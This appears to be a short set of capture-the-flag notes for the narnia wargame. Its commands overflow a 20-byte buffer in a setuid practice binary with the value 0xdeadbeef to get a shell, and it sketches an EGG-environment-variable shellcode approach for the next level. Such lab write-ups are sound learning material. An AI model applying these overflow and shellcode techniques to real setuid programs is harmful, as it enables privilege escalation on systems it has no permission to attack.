# now this is obvious it's buffer overflow
# looking at the code I can notice the variable is a long, and there's a buffer of 20 bytes. I write in 20 chars (20 bytes) and my desired bytes.
# I confirmed it's working by running:
echo aaaabbbbccccddddeeee0000 | ./narnia0
# and it's working. val: 0x30303030 (chr 0 = 30h)
# so I simply inject bytes now
echo -e aaaabbbbccccddddeeee'\xEF\xBE\xAD\xDE' | ./narnia0
# now I certainly know it works and use cat to gain stdin access
(echo -e aaaabbbbccccddddeeee'\xEF\xBE\xAD\xDE'; cat;) | ./narnia0
# and since it's setuid let's first figure out for sure who I am

# narnia1
# from now on I'm going to stop writing cd /narnia and ls -la because it's obvious
# for every level from now it's obvious that I do cat narniax.c and execute narniax
# so after looking at the code and executing the program I figure I need to create an env var named EGG.
# I figure it's a pointer that gets set to the value of the var EGG.
# Now I need to figure how to make it cat /etc/narnia_pass/narnia2
# I figure it's shellcode
# things didn't work as expected and I believe there was an issue that required contact with admins and gave up as there are better challenges
